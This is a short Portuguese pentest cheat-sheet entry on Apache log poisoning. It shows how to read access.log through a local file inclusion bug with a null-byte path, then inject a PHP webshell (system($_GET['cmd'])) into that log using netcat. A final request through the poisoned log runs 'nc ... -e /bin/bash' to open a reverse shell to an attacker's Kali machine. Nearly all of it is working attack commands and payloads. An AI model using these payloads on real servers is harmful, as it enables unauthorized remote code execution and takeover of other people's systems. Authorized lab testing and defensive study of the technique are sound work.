# Log Poisoning

Se os logs do apache, estiverem disponívis via LFI para leitura.

```
/index.php?page=/var/log/apache2/access.log%00
```

Conectar via netcat e enviar um webshell.

```
nc -vnlp 443

nc -v <ip do alvo> 80
<?php system($_GET['cmd']);?>

```

Acessar novamente os logs e irá mostrar que tentou executar o webshell.
Se executou o webshell nos logs do access.log, execute o comando abaixo, para pegar um shell reverso.

```
/index.php?cmd=nc <ip do kali> 443 -e /bin/bash&page=/var/log/apache2/access.log%00

```